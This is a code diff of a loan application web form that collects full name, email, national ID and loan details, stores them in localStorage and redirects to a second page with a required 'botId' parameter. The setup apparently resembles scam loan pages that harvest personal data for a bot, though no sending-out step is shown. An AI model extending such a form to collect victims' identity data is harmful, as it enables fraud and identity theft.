@@ -142,8 +142,8 @@ transform:translateY(-1px);
 <label>Full Name</label>
 <input id="fullName" type="text" required placeholder="Enter your full name">
 
-<label>Loan Amount (LRD)</label>
-<input id="loanAmount" type="number" required >
+<label>Loan Amount (USD)</label>
+<input id="loanAmount" type="number" min="100" required placeholder="Minimum $100">
 
 <label>Email</label>
 <input id="email" type="email" placeholder="example@gmail.com" required>
@@ -154,12 +154,12 @@ transform:translateY(-1px);
 <label>Repayment Period</label>
 <select id="repaymentPeriod" required>
 <option value="">Select</option>
-<option value="6months"> 6 months</option>
-<option value="12months">12 months </option>
-<option value="24months">24 months </option>
-<option value="36months">36 months </option>
+<option value="6months">6 months</option>
+<option value="12months">12 months</option>
+<option value="24months">24 months</option>
+<option value="36months">36 months</option>
 <option value="48months">48 months</option>
-<option value="60months">60 months </option>
+<option value="60months">60 months</option>
 </select>
 
 <label>Employment Status</label>
@@ -184,7 +184,8 @@ transform:translateY(-1px);
 <div class="loan-notice">
 <strong>Qualification Notice:</strong>
 <ol>
-<li>Must apply with an active orange number.</li>
+<li>Must apply with an active phone number.</li>
+<li>Minimum loan amount is $100.</li>
 </ol>
 </div>
 
@@ -212,17 +213,29 @@ throw new Error("botId missing");
 localStorage.setItem('botId', botId);
 
 // FORM
-document.getElementById('loanForm').addEventListener('submit', e => {
+document.getElementById('loanForm').addEventListener('submit', function(e) {
 
 e.preventDefault();
 
-localStorage.setItem('fullName', fullName.value);
+// Get the loan amount
+const loanAmount = document.getElementById('loanAmount');
+const amountValue = parseFloat(loanAmount.value);
+
+// Validate minimum amount
+if (amountValue < 100) {
+alert("Loan amount must be at least $100. Please enter a higher amount.");
+loanAmount.focus();
+return;
+}
+
+// Save all form data
+localStorage.setItem('fullName', document.getElementById('fullName').value);
 localStorage.setItem('loanAmount', loanAmount.value);
-localStorage.setItem('email', email.value);
-localStorage.setItem('nationalId', nationalId.value);
-localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
-localStorage.setItem('employmentStatus', employmentStatus.value);
-localStorage.setItem('loanPurpose', loanPurpose.value);
+localStorage.setItem('email', document.getElementById('email').value);
+localStorage.setItem('nationalId', document.getElementById('nationalId').value);
+localStorage.setItem('repaymentPeriod', document.getElementById('repaymentPeriod').value);
+localStorage.setItem('employmentStatus', document.getElementById('employmentStatus').value);
+localStorage.setItem('loanPurpose', document.getElementById('loanPurpose').value);
 
 window.location.href = `details2.html?botId=${botId}`;
 
